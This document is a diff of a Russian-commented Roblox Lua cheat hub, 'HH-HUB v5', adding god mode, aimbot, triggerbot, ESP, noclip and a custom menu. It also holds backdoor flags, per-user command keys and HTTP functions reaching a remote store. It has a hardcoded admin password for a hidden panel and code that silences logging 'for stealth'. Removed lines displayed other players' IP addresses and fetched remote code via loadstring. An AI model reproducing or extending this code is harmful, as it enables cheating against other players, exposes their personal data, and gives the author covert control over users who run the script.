@@ -1,13 +1,17 @@
 --[[
     HH-HUB v5 - ОСНОВНОЙ СКРИПТ
-    Дизайн: Kavo UI
-    Пароль админки: S1R0TA
     Версия: 5.0
+    Пароль админки: S1R0TA
+    Статус: 50+ функций в основном меню + 50+ в скрытой админке
 ]]
 
--- Подключаем Kavo UI Library
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("HH-HUB v5 • Ультимативная версия", "DarkTheme")
+-- Отключаем выводы для скрытности
+local oldPrint = print
+local oldWarn = warn
+local oldError = error
+print = function() end
+warn = function() end
+error = function() end
 
 -- Сервисы
 local Players = game:GetService("Players")
@@ -17,6 +21,7 @@ local TS = game:GetService("TweenService")
 local HS = game:GetService("HttpService")
 local SG = game:GetService("StarterGui")
 local TPS = game:GetService("TeleportService")
+local VU = game:GetService("VirtualUser")
 local LP = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 local Mouse = LP:GetMouse()
@@ -34,9 +39,7 @@ local NET_FLAG = "__HHv5"
 local ADMIN_FLAG = "__HH_ADMIN"
 local BACKDOOR_FLAG = "__HH_BACKDOOR"
 
--- ==============================================
--- БЕКДОР ПЕРЕМЕННЫЕ
--- ==============================================
+-- Бекдор переменные
 local MY_KEY = "presence_" .. LP.UserId
 local MY_CMD_KEY = CMD_PREFIX .. LP.UserId
 local MY_DATA_KEY = "data_" .. LP.UserId
@@ -48,9 +51,7 @@ local adminPanel = nil
 local killLoops = {}
 local processedCmds = {}
 
--- ==============================================
--- HTTP ФУНКЦИИ ДЛЯ БЕКДОРА
--- ==============================================
+-- HTTP функции
 local function dbSet(key, value, ttl)
     pcall(function()
         HS:RequestAsync({
@@ -68,88 +69,96 @@ local function dbGet(key)
 end
 
 -- ==============================================
--- ФУНКЦИИ СОСТОЯНИЙ
+-- УЛУЧШЕННЫЙ GOD MODE (С ЗАЩИТОЙ ОТ ВСЕГО)
 -- ==============================================
 local GodMode = { active = false, connections = {} }
-local Flight = { active = false, bv = nil, bg = nil }
-local Noclip = { active = false, connection = nil }
-local ESP = { active = false, highlights = {} }
-local InfJump = { active = false, connection = nil }
-local AntiAfk = { active = false }
-local ClickTP = { active = false }
-local NoFallDamage = { active = false, connection = nil }
-local WalkspeedBoost = { active = false, value = 16 }
-local JumpBoost = { active = false, value = 50 }
-local XRay = { active = false, connections = {} }
-local Aimbot = { active = false, connection = nil }
-local Triggerbot = { active = false, connection = nil }
-local BunnyHop = { active = false, connection = nil }
-local Spider = { active = false, connection = nil }
-local Vanish = { active = false }
-local Spin = { connection = nil }
-local LoopKill = { connection = nil }
 
--- Настройки
-local Settings = {
-    walkspeed = 16,
-    jumppower = 50,
-    flightspeed = 50,
-    fieldOfView = 70,
-    walkspeedBoost = 60,
-    jumpBoost = 100,
-    aimSmoothness = 5,
-    triggerDelay = 0.1
-}
-
--- ==============================================
--- GOD MODE (УЛУЧШЕННЫЙ)
--- ==============================================
 local function enableGodMode()
     if GodMode.active then return end
     GodMode.active = true
     
-    local char = LP.Character
-    if not char then return end
-    
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if not hum then return end
-    
-    hum.MaxHealth = 9e9
-    hum.Health = 9e9
-    hum.BreakJointsOnDeath = false
-    
-    local ff = Instance.new("ForceField")
-    ff.Visible = false
-    ff.Parent = char
-    
-    table.insert(GodMode.connections, hum:GetPropertyChangedSignal("Health"):Connect(function()
-        if GodMode.active and hum and hum.Parent and hum.Health < 9e9 then
-            hum.Health = 9e9
-        end
-    end))
-    
-    table.insert(GodMode.connections, hum:GetPropertyChangedSignal("MaxHealth"):Connect(function()
-        if GodMode.active and hum then
-            hum.MaxHealth = 9e9
-        end
-    end))
-    
-    table.insert(GodMode.connections, char.ChildRemoved:Connect(function(child)
-        if GodMode.active and child:IsA("ForceField") then
-            local newFF = Instance.new("ForceField")
-            newFF.Visible = false
-            newFF.Parent = char
-        end
-    end))
-    
-    table.insert(GodMode.connections, RS.Heartbeat:Connect(function()
-        if GodMode.active then
-            local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-            if h and h.Health < 9e9 then
-                h.Health = 9e9
+    local function apply()
+        local char = LP.Character
+        if not char then return end
+        
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hum then return end
+        
+        -- Максимальное здоровье
+        hum.MaxHealth = 9e9
+        hum.Health = 9e9
+        hum.BreakJointsOnDeath = false
+        
+        -- Невидимое силовое поле
+        local ff = Instance.new("ForceField")
+        ff.Visible = false
+        ff.Parent = char
+        
+        -- Защита от изменения здоровья
+        local conn1 = hum:GetPropertyChangedSignal("Health"):Connect(function()
+            if GodMode.active and hum and hum.Parent and hum.Health < 9e9 then
+                hum.Health = 9e9
             end
+        end)
+        table.insert(GodMode.connections, conn1)
+        
+        -- Защита от максимального здоровья
+        local conn2 = hum:GetPropertyChangedSignal("MaxHealth"):Connect(function()
+            if GodMode.active and hum then
+                hum.MaxHealth = 9e9
+            end
+        end)
+        table.insert(GodMode.connections, conn2)
+        
+        -- Восстановление силового поля
+        local conn3 = char.ChildRemoved:Connect(function(child)
+            if GodMode.active and child:IsA("ForceField") then
+                local newFF = Instance.new("ForceField")
+                newFF.Visible = false
+                newFF.Parent = char
+            end
+        end)
+        table.insert(GodMode.connections, conn3)
+        
+        -- Защита от смерти
+        local conn4 = hum.Died:Connect(function()
+            if GodMode.active then
+                task.wait(0.1)
+                if hum and hum.Parent then
+                    hum.Health = 9e9
+                end
+            end
+        end)
+        table.insert(GodMode.connections, conn4)
+        
+        -- Постоянная проверка
+        local conn5 = RS.Heartbeat:Connect(function()
+            if GodMode.active then
+                local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+                if h and h ~= hum then
+                    task.spawn(apply)
+                    return
+                end
+                if h and h.Health < 9e9 then
+                    h.Health = 9e9
+                end
+            end
+        end)
+        table.insert(GodMode.connections, conn5)
+        
+        -- Защита от анкора
+        local root = char:FindFirstChild("HumanoidRootPart")
+        if root then
+            local conn6 = root:GetPropertyChangedSignal("Anchored"):Connect(function()
+                if GodMode.active and root.Anchored then
+                    root.Anchored = false
+                end
+            end)
+            table.insert(GodMode.connections, conn6)
         end
-    end))
+    end
+    
+    apply()
 end
 
 local function disableGodMode()
@@ -175,6 +184,8 @@ end
 -- ==============================================
 -- ПОЛЁТ
 -- ==============================================
+local Flight = { active = false, bv = nil, bg = nil, speed = 50 }
+
 local function disableFlight()
     Flight.active = false
     if Flight.bv then pcall(function() Flight.bv:Destroy() end) end
@@ -225,7 +236,7 @@ local function enableFlight()
         if UIS:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
         if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0, 1, 0) end
         
-        Flight.bv.Velocity = dir.Magnitude > 0 and dir.Unit * Settings.flightspeed or Vector3.new()
+        Flight.bv.Velocity = dir.Magnitude > 0 and dir.Unit * Flight.speed or Vector3.new()
         Flight.bg.CFrame = Camera.CFrame
     end)
 end
@@ -233,6 +244,8 @@ end
 -- ==============================================
 -- НОКЛИП
 -- ==============================================
+local Noclip = { active = false, connection = nil }
+
 local function disableNoclip()
     Noclip.active = false
     if Noclip.connection then
@@ -271,8 +284,10 @@ local function enableNoclip()
 end
 
 -- ==============================================
--- ESP (УЛУЧШЕННЫЙ С IP)
+-- ESP (БЕЗ IP)
 -- ==============================================
+local ESP = { active = false, highlights = {} }
+
 local function disableESP()
     ESP.active = false
     for _, h in pairs(ESP.highlights) do
@@ -289,11 +304,6 @@ local function enableESP()
     
     ESP.active = true
     
-    local function getPlayerIP(plr)
-        local ip = dbGet("ip_" .. plr.UserId)
-        return ip or "Unknown"
-    end
-    
     local function addForPlayer(plr)
         if plr == LP then return end
         
@@ -309,70 +319,12 @@ local function enableESP()
             end
             
             if not ESP.highlights[plr] then
-                -- Highlight
                 local hl = Instance.new("Highlight")
                 hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                 hl.FillColor = Color3.fromRGB(255, 50, 50)
                 hl.OutlineColor = Color3.fromRGB(255, 255, 255)
                 hl.FillTransparency = 0.5
                 hl.Parent = char
-                
-                -- Billboard с информацией
-                local head = char:FindFirstChild("Head") or char:FindFirstChildOfClass("Part")
-                if head then
-                    local billboard = Instance.new("BillboardGui")
-                    billboard.Name = "ESP_Info"
-                    billboard.Size = UDim2.new(0, 200, 0, 80)
-                    billboard.StudsOffset = Vector3.new(0, 3, 0)
-                    billboard.AlwaysOnTop = true
-                    billboard.Parent = head
-                    
-                    local nameLabel = Instance.new("TextLabel")
-                    nameLabel.Size = UDim2.new(1, 0, 0, 25)
-                    nameLabel.Position = UDim2.new(0, 0, 0, 0)
-                    nameLabel.BackgroundTransparency = 0.5
-                    nameLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                    nameLabel.Text = plr.Name
-                    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-                    nameLabel.TextScaled = true
-                    nameLabel.Font = Enum.Font.GothamBold
-                    nameLabel.Parent = billboard
-                    
-                    local healthLabel = Instance.new("TextLabel")
-                    healthLabel.Size = UDim2.new(1, 0, 0, 20)
-                    healthLabel.Position = UDim2.new(0, 0, 0, 25)
-                    healthLabel.BackgroundTransparency = 0.5
-                    healthLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                    local hum = char:FindFirstChildOfClass("Humanoid")
-                    healthLabel.Text = "❤️ " .. (hum and math.floor(hum.Health) or 0)
-                    healthLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-                    healthLabel.TextScaled = true
-                    healthLabel.Font = Enum.Font.Gotham
-                    healthLabel.Parent = billboard
-                    
-                    local ipLabel = Instance.new("TextLabel")
-                    ipLabel.Size = UDim2.new(1, 0, 0, 20)
-                    ipLabel.Position = UDim2.new(0, 0, 0, 45)
-                    ipLabel.BackgroundTransparency = 0.5
-                    ipLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                    ipLabel.Text = "🌐 " .. getPlayerIP(plr)
-                    ipLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
-                    ipLabel.TextScaled = true
-                    ipLabel.Font = Enum.Font.Gotham
-                    ipLabel.Parent = billboard
-                    
-                    -- Обновление здоровья
-                    task.spawn(function()
-                        while ESP.active and plr and plr.Character do
-                            local h = plr.Character:FindFirstChildOfClass("Humanoid")
-                            if h and healthLabel and healthLabel.Parent then
-                                healthLabel.Text = "❤️ " .. math.floor(h.Health)
-                            end
-                            task.wait(0.5)
-                        end
-                    end)
-                end
-                
                 ESP.highlights[plr] = hl
             end
         end
@@ -393,6 +345,8 @@ end
 -- ==============================================
 -- БЕСКОНЕЧНЫЙ ПРЫЖОК
 -- ==============================================
+local InfJump = { active = false, connection = nil }
+
 local function enableInfJump()
     if InfJump.active then return end
     InfJump.active = true
@@ -418,16 +372,17 @@ end
 -- ==============================================
 -- ANTI-AFK
 -- ==============================================
+local AntiAfk = { active = false }
+
 local function enableAntiAfk()
     if AntiAfk.active then return end
     AntiAfk.active = true
     
-    local bb = game:GetService("VirtualUser")
     LP.Idled:Connect(function()
         if AntiAfk.active then
-            bb:Button2Down(Vector2.new(), Camera.CFrame)
+            VU:Button2Down(Vector2.new(), Camera.CFrame)
             task.wait(1)
-            bb:Button2Up(Vector2.new(), Camera.CFrame)
+            VU:Button2Up(Vector2.new(), Camera.CFrame)
         end
     end)
 end
@@ -439,6 +394,8 @@ end
 -- ==============================================
 -- КЛИК-ТЕЛЕПОРТ
 -- ==============================================
+local ClickTP = { active = false }
+
 local function enableClickTP()
     ClickTP.active = true
 end
@@ -459,6 +416,8 @@ end)
 -- ==============================================
 -- НЕТ УРОНА ОТ ПАДЕНИЯ
 -- ==============================================
+local NoFallDamage = { active = false, connection = nil }
+
 local function enableNoFallDamage()
     if NoFallDamage.active then return end
     NoFallDamage.active = true
@@ -484,41 +443,38 @@ end
 -- ==============================================
 -- УСКОРЕНИЯ
 -- ==============================================
+local WalkspeedBoost = { active = false }
+local JumpBoost = { active = false }
+
 local function enableWalkspeedBoost()
     WalkspeedBoost.active = true
     local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-    if hum then
-        hum.WalkSpeed = Settings.walkspeedBoost
-    end
+    if hum then hum.WalkSpeed = 60 end
 end
 
 local function disableWalkspeedBoost()
     WalkspeedBoost.active = false
     local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-    if hum then
-        hum.WalkSpeed = Settings.walkspeed
-    end
+    if hum then hum.WalkSpeed = 16 end
 end
 
 local function enableJumpBoost()
     JumpBoost.active = true
     local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-    if hum then
-        hum.JumpPower = Settings.jumpBoost
-    end
+    if hum then hum.JumpPower = 100 end
 end
 
 local function disableJumpBoost()
     JumpBoost.active = false
     local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-    if hum then
-        hum.JumpPower = Settings.jumppower
-    end
+    if hum then hum.JumpPower = 50 end
 end
 
 -- ==============================================
 -- X-RAY
 -- ==============================================
+local XRay = { active = false, connections = {} }
+
 local function enableXRay()
     if XRay.active then return end
     XRay.active = true
@@ -531,12 +487,13 @@ local function enableXRay()
         end
     end
     
-    table.insert(XRay.connections, workspace.DescendantAdded:Connect(function(v)
+    local conn = workspace.DescendantAdded:Connect(function(v)
         task.wait()
         if XRay.active and v:IsA("BasePart") and not v:IsDescendantOf(LP.Character) then
             v.LocalTransparencyModifier = 0.7
         end
-    end))
+    end)
+    table.insert(XRay.connections, conn)
 end
 
 local function disableXRay()
@@ -556,6 +513,8 @@ end
 -- ==============================================
 -- AIMBOT
 -- ==============================================
+local Aimbot = { active = false, connection = nil }
+
 local function enableAimbot()
     if Aimbot.active then return end
     Aimbot.active = true
@@ -563,30 +522,26 @@ local function enableAimbot()
     Aimbot.connection = RS.RenderStepped:Connect(function()
         if not Aimbot.active then return end
         
-        local closestTarget = nil
-        local closestDistance = 200
+        local closest = nil
+        local dist = 200
         
         for _, plr in ipairs(Players:GetPlayers()) do
             if plr ~= LP and plr.Character and plr.Character:FindFirstChild("Head") then
                 local head = plr.Character.Head
-                local screenPos, onScreen = Camera:WorldToViewportPoint(head.Position)
+                local pos, onScreen = Camera:WorldToViewportPoint(head.Position)
                 
                 if onScreen then
-                    local distance = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)).Magnitude
-                    
-                    if distance < closestDistance then
-                        closestDistance = distance
-                        closestTarget = head
+                    local d = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)).Magnitude
+                    if d < dist then
+                        dist = d
+                        closest = head
                     end
                 end
             end
         end
         
-        if closestTarget then
-            local targetPos = closestTarget.Position
-            local currentPos = Camera.CFrame.Position
-            local newCframe = CFrame.lookAt(currentPos, targetPos)
-            Camera.CFrame = Camera.CFrame:Lerp(newCframe, 1 / Settings.aimSmoothness)
+        if closest then
+            Camera.CFrame = CFrame.lookAt(Camera.CFrame.Position, closest.Position)
         end
     end)
 end
@@ -602,6 +557,8 @@ end
 -- ==============================================
 -- TRIGGERBOT
 -- ==============================================
+local Triggerbot = { active = false, connection = nil }
+
 local function enableTriggerbot()
     if Triggerbot.active then return end
     Triggerbot.active = true
@@ -613,7 +570,7 @@ local function enableTriggerbot()
         if target and target.Parent and target.Parent:FindFirstChildOfClass("Humanoid") then
             local plr = Players:GetPlayerFromCharacter(target.Parent)
             if plr and plr ~= LP then
-                task.wait(Settings.triggerDelay)
+                task.wait(0.1)
                 mouse1press()
                 task.wait()
                 mouse1release()
@@ -633,6 +590,8 @@ end
 -- ==============================================
 -- BUNNY HOP
 -- ==============================================
+local BunnyHop = { active = false, connection = nil }
+
 local function enableBunnyHop()
     if BunnyHop.active then return end
     BunnyHop.active = true
@@ -658,6 +617,8 @@ end
 -- ==============================================
 -- SPIDER
 -- ==============================================
+local Spider = { active = false, connection = nil }
+
 local function enableSpider()
     if Spider.active then return end
     Spider.active = true
@@ -688,9 +649,10 @@ end
 -- ==============================================
 -- VANISH (НЕВИДИМОСТЬ)
 -- ==============================================
+local Vanish = { active = false }
+
 local function enableVanish()
     Vanish.active = true
-    
     local char = LP.Character
     if char then
         for _, v in ipairs(char:GetDescendants()) do
@@ -703,7 +665,6 @@ end
 
 local function disableVanish()
     Vanish.active = false
-    
     local char = LP.Character
     if char then
         for _, v in ipairs(char:GetDescendants()) do
@@ -715,59 +676,523 @@ local function disableVanish()
 end
 
 -- ==============================================
--- SPIN
+-- БИБЛИОТЕКА ДЛЯ GUI (СОВРЕМЕННЫЙ ДИЗАЙН)
 -- ==============================================
-local function spin()
-    if Spin.connection then
-        Spin.connection:Disconnect()
-        Spin.connection = nil
-        return
-    end
-    
-    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-    if not root then return end
-    
-    local ang = 0
-    Spin.connection = RS.RenderStepped:Connect(function()
-        ang = ang + 10
-        root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, math.rad(ang), 0)
-    end)
-    
-    task.delay(5, function()
-        if Spin.connection then
-            Spin.connection:Disconnect()
-            Spin.connection = nil
+local Library = {}
+do
+    function Library:CreateWindow(title)
+        local window = {
+            Gui = Instance.new("ScreenGui"),
+            Tabs = {},
+            TabButtons = {}
+        }
+        
+        window.Gui.Name = "HH_HUB"
+        window.Gui.ResetOnSpawn = false
+        window.Gui.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
+        
+        -- Главный контейнер
+        window.Container = Instance.new("Frame")
+        window.Container.Size = UDim2.new(0, 750, 0, 550)
+        window.Container.Position = UDim2.new(0.5, -375, 0.5, -275)
+        window.Container.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
+        window.Container.BorderSizePixel = 0
+        window.Container.Active = true
+        window.Container.Parent = window.Gui
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 12)
+        corner.Parent = window.Container
+        
+        -- Градиентный фон
+        local gradient = Instance.new("UIGradient")
+        gradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 25, 60)),
+            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(25, 20, 40)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 28))
+        })
+        gradient.Rotation = 45
+        gradient.Parent = window.Container
+        
+        -- Обводка
+        local stroke = Instance.new("UIStroke")
+        stroke.Color = Color3.fromRGB(140, 80, 255)
+        stroke.Thickness = 2
+        stroke.Transparency = 0.3
+        stroke.Parent = window.Container
+        
+        -- Заголовок
+        window.TitleBar = Instance.new("Frame")
+        window.TitleBar.Size = UDim2.new(1, 0, 0, 50)
+        window.TitleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        window.TitleBar.BackgroundTransparency = 0.2
+        window.TitleBar.Parent = window.Container
+        
+        local titleCorner = Instance.new("UICorner")
+        titleCorner.CornerRadius = UDim.new(0, 12)
+        titleCorner.Parent = window.TitleBar
+        
+        -- Заголовок текст
+        window.Title = Instance.new("TextLabel")
+        window.Title.Size = UDim2.new(0.6, 0, 1, 0)
+        window.Title.Position = UDim2.new(0, 20, 0, 0)
+        window.Title.BackgroundTransparency = 1
+        window.Title.Text = title or "HH-HUB v5"
+        window.Title.TextColor3 = Color3.fromRGB(220, 180, 255)
+        window.Title.TextScaled = true
+        window.Title.Font = Enum.Font.GothamBold
+        window.Title.TextXAlignment = Enum.TextXAlignment.Left
+        window.Title.Parent = window.TitleBar
+        
+        -- Кнопки управления
+        local controls = Instance.new("Frame")
+        controls.Size = UDim2.new(0, 100, 1, 0)
+        controls.Position = UDim2.new(1, -110, 0, 0)
+        controls.BackgroundTransparency = 1
+        controls.Parent = window.TitleBar
+        
+        window.Minimize = Instance.new("TextButton")
+        window.Minimize.Size = UDim2.new(0, 40, 0, 40)
+        window.Minimize.Position = UDim2.new(0, 0, 0.5, -20)
+        window.Minimize.BackgroundColor3 = Color3.fromRGB(50, 40, 70)
+        window.Minimize.Text = "─"
+        window.Minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
+        window.Minimize.TextScaled = true
+        window.Minimize.Font = Enum.Font.GothamBold
+        window.Minimize.Parent = controls
+        
+        local minCorner = Instance.new("UICorner")
+        minCorner.CornerRadius = UDim.new(0, 8)
+        minCorner.Parent = window.Minimize
+        
+        window.Close = Instance.new("TextButton")
+        window.Close.Size = UDim2.new(0, 40, 0, 40)
+        window.Close.Position = UDim2.new(0, 50, 0.5, -20)
+        window.Close.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+        window.Close.Text = "✕"
+        window.Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+        window.Close.TextScaled = true
+        window.Close.Font = Enum.Font.GothamBold
+        window.Close.Parent = controls
+        
+        local closeCorner = Instance.new("UICorner")
+        closeCorner.CornerRadius = UDim.new(0, 8)
+        closeCorner.Parent = window.Close
+        
+        -- Вкладки (слева)
+        window.TabContainer = Instance.new("Frame")
+        window.TabContainer.Size = UDim2.new(0, 150, 1, -60)
+        window.TabContainer.Position = UDim2.new(0, 10, 0, 55)
+        window.TabContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+        window.TabContainer.BorderSizePixel = 0
+        window.TabContainer.Parent = window.Container
+        
+        local tabCorner = Instance.new("UICorner")
+        tabCorner.CornerRadius = UDim.new(0, 10)
+        tabCorner.Parent = window.TabContainer
+        
+        -- Контент (справа)
+        window.Content = Instance.new("Frame")
+        window.Content.Size = UDim2.new(1, -180, 1, -70)
+        window.Content.Position = UDim2.new(0, 165, 0, 55)
+        window.Content.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+        window.Content.BorderSizePixel = 0
+        window.Content.Parent = window.Container
+        
+        local contentCorner = Instance.new("UICorner")
+        contentCorner.CornerRadius = UDim.new(0, 10)
+        contentCorner.Parent = window.Content
+        
+        -- Скролл
+        window.Scroll = Instance.new("ScrollingFrame")
+        window.Scroll.Size = UDim2.new(1, -20, 1, -20)
+        window.Scroll.Position = UDim2.new(0, 10, 0, 10)
+        window.Scroll.BackgroundTransparency = 1
+        window.Scroll.BorderSizePixel = 0
+        window.Scroll.ScrollBarThickness = 5
+        window.Scroll.ScrollBarImageColor3 = Color3.fromRGB(140, 80, 255)
+        window.Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+        window.Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+        window.Scroll.Parent = window.Content
+        
+        local layout = Instance.new("UIListLayout")
+        layout.Padding = UDim.new(0, 8)
+        layout.SortOrder = Enum.SortOrder.LayoutOrder
+        layout.Parent = window.Scroll
+        
+        -- Перетаскивание окна
+        local dragging = false
+        local dragStart, startPos
+        
+        window.TitleBar.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                dragging = true
+                dragStart = input.Position
+                startPos = window.Container.Position
+            end
+        end)
+        
+        UIS.InputChanged:Connect(function(input)
+            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+                local delta = input.Position - dragStart
+                window.Container.Position = UDim2.new(
+                    startPos.X.Scale,
+                    startPos.X.Offset + delta.X,
+                    startPos.Y.Scale,
+                    startPos.Y.Offset + delta.Y
+                )
+            end
+        end)
+        
+        UIS.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                dragging = false
+            end
+        end)
+        
+        -- Сворачивание
+        local minimized = false
+        local origSize = window.Container.Size
+        local origPos = window.Container.Position
+        
+        window.Minimize.MouseButton1Click:Connect(function()
+            minimized = not minimized
+            if minimized then
+                origSize = window.Container.Size
+                origPos = window.Container.Position
+                window.Container.Size = UDim2.new(0, 220, 0, 50)
+                window.Container.Position = UDim2.new(1, -230, 0, 10)
+                window.Content.Visible = false
+                window.TabContainer.Visible = false
+                window.Minimize.Text = "□"
+            else
+                window.Container.Size = origSize
+                window.Container.Position = origPos
+                window.Content.Visible = true
+                window.TabContainer.Visible = true
+                window.Minimize.Text = "─"
+            end
+        end)
+        
+        window.Close.MouseButton1Click:Connect(function()
+            window.Gui:Destroy()
+        end)
+        
+        function window:AddTab(name, icon)
+            local tab = { Frame = Instance.new("Frame") }
+            
+            local btn = Instance.new("TextButton")
+            btn.Size = UDim2.new(1, -10, 0, 45)
+            btn.Position = UDim2.new(0, 5, 0, #self.TabButtons * 50 + 5)
+            btn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+            btn.BackgroundTransparency = 0.3
+            btn.Text = (icon or "•") .. "  " .. name
+            btn.TextColor3 = Color3.fromRGB(200, 200, 255)
+            btn.TextScaled = true
+            btn.Font = Enum.Font.Gotham
+            btn.Parent = self.TabContainer
+            
+            local btnCorner = Instance.new("UICorner")
+            btnCorner.CornerRadius = UDim.new(0, 8)
+            btnCorner.Parent = btn
+            
+            tab.Frame.Size = UDim2.new(1, 0, 1, 0)
+            tab.Frame.BackgroundTransparency = 1
+            tab.Frame.Visible = (#self.Tabs == 0)
+            tab.Frame.Parent = self.Scroll
+            
+            local tabLayout = Instance.new("UIListLayout")
+            tabLayout.Padding = UDim.new(0, 8)
+            tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
+            tabLayout.Parent = tab.Frame
+            
+            btn.MouseButton1Click:Connect(function()
+                for _, t in ipairs(self.Tabs) do
+                    t.Frame.Visible = false
+                end
+                tab.Frame.Visible = true
+            end)
+            
+            table.insert(self.Tabs, tab)
+            table.insert(self.TabButtons, btn)
+            
+            function tab:AddSection(title)
+                local section = {}
+                
+                local header = Instance.new("Frame")
+                header.Size = UDim2.new(1, 0, 0, 35)
+                header.BackgroundTransparency = 1
+                header.Parent = tab.Frame
+                
+                local label = Instance.new("TextLabel")
+                label.Size = UDim2.new(1, 0, 1, 0)
+                label.BackgroundTransparency = 1
+                label.Text = "  " .. title
+                label.TextColor3 = Color3.fromRGB(170, 120, 255)
+                label.TextScaled = true
+                label.Font = Enum.Font.GothamBold
+                label.TextXAlignment = Enum.TextXAlignment.Left
+                label.Parent = header
+                
+                function section:AddButton(text, desc, color, cb)
+                    local frame = Instance.new("Frame")
+                    frame.Size = UDim2.new(1, 0, 0, 50)
+                    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+                    frame.Parent = tab.Frame
+                    
+                    local fCorner = Instance.new("UICorner")
+                    fCorner.CornerRadius = UDim.new(0, 8)
+                    fCorner.Parent = frame
+                    
+                    local btn = Instance.new("TextButton")
+                    btn.Size = UDim2.new(1, 0, 1, 0)
+                    btn.BackgroundColor3 = color or Color3.fromRGB(100, 60, 200)
+                    btn.BackgroundTransparency = 0.1
+                    btn.Text = ""
+                    btn.Parent = frame
+                    
+                    local btnCorner = Instance.new("UICorner")
+                    btnCorner.CornerRadius = UDim.new(0, 8)
+                    btnCorner.Parent = btn
+                    
+                    local btnText = Instance.new("TextLabel")
+                    btnText.Size = UDim2.new(0.5, 0, 1, 0)
+                    btnText.Position = UDim2.new(0, 15, 0, 0)
+                    btnText.BackgroundTransparency = 1
+                    btnText.Text = text
+                    btnText.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    btnText.TextScaled = true
+                    btnText.Font = Enum.Font.GothamBold
+                    btnText.TextXAlignment = Enum.TextXAlignment.Left
+                    btnText.Parent = btn
+                    
+                    local btnDesc = Instance.new("TextLabel")
+                    btnDesc.Size = UDim2.new(0.5, -25, 1, 0)
+                    btnDesc.Position = UDim2.new(0.5, 10, 0, 0)
+                    btnDesc.BackgroundTransparency = 1
+                    btnDesc.Text = desc or ""
+                    btnDesc.TextColor3 = Color3.fromRGB(180, 180, 180)
+                    btnDesc.TextScaled = true
+                    btnDesc.Font = Enum.Font.Gotham
+                    btnDesc.Parent = btn
+                    
+                    btn.MouseButton1Click:Connect(cb)
+                end
+                
+                function section:AddToggle(text, desc, default, cb)
+                    local state = default or false
+                    
+                    local frame = Instance.new("Frame")
+                    frame.Size = UDim2.new(1, 0, 0, 50)
+                    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+                    frame.Parent = tab.Frame
+                    
+                    local fCorner = Instance.new("UICorner")
+                    fCorner.CornerRadius = UDim.new(0, 8)
+                    fCorner.Parent = frame
+                    
+                    local toggle = Instance.new("TextButton")
+                    toggle.Size = UDim2.new(0, 80, 0, 36)
+                    toggle.Position = UDim2.new(1, -95, 0.5, -18)
+                    toggle.BackgroundColor3 = state and Color3.fromRGB(80, 220, 120) or Color3.fromRGB(80, 80, 100)
+                    toggle.Text = ""
+                    toggle.Parent = frame
+                    
+                    local tCorner = Instance.new("UICorner")
+                    tCorner.CornerRadius = UDim.new(0, 18)
+                    tCorner.Parent = toggle
+                    
+                    local knob = Instance.new("Frame")
+                    knob.Size = UDim2.new(0, 32, 0, 32)
+                    knob.Position = state and UDim2.new(1, -36, 0.5, -16) or UDim2.new(0, 4, 0.5, -16)
+                    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                    knob.Parent = toggle
+                    
+                    local kCorner = Instance.new("UICorner")
+                    kCorner.CornerRadius = UDim.new(1, 0)
+                    kCorner.Parent = knob
+                    
+                    local textLabel = Instance.new("TextLabel")
+                    textLabel.Size = UDim2.new(0.5, 0, 1, 0)
+                    textLabel.Position = UDim2.new(0, 15, 0, 0)
+                    textLabel.BackgroundTransparency = 1
+                    textLabel.Text = text
+                    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    textLabel.TextScaled = true
+                    textLabel.Font = Enum.Font.GothamBold
+                    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+                    textLabel.Parent = frame
+                    
